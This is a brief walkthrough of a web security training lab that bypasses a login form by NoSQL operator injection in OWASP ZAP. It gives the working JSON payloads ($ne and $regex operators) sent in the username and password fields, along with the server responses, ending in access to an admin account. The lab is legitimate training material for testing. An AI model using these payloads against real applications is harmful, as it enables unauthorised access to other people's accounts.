# Lab: Exploiting NoSQL operator injection to bypass authentication [OWASP Zed Attack Proxy]

In ZAP's browser log in as `wiener:peter`, under __History__ tab, find `POST /login` request with body:

```json
{"username":"wiener","password":"peter"}
```

Right-click the request and select "Open in Requester Tab". Change the value of `username` parameter from `"wiener"` to `{"$ne":""}` and click send. Response:

```
HTTP/1.1 302 Found
Location: /my-account?id=wiener
```

Now change the value of the `password` parameter from `"peter"` to `{"$ne":""}` and send the request:

```html
<h4>Internal Server Error</h4>
<p class=is-warning>Query returned unexpected number of records</p>
```

This suggests that our query matched too many users. Now change the value of `username` parameter to `{"$regex":"admin.*"}` and send the request:

```
HTTP/1.1 302 Found
Location: /my-account?id=admin6fn8crcu
```


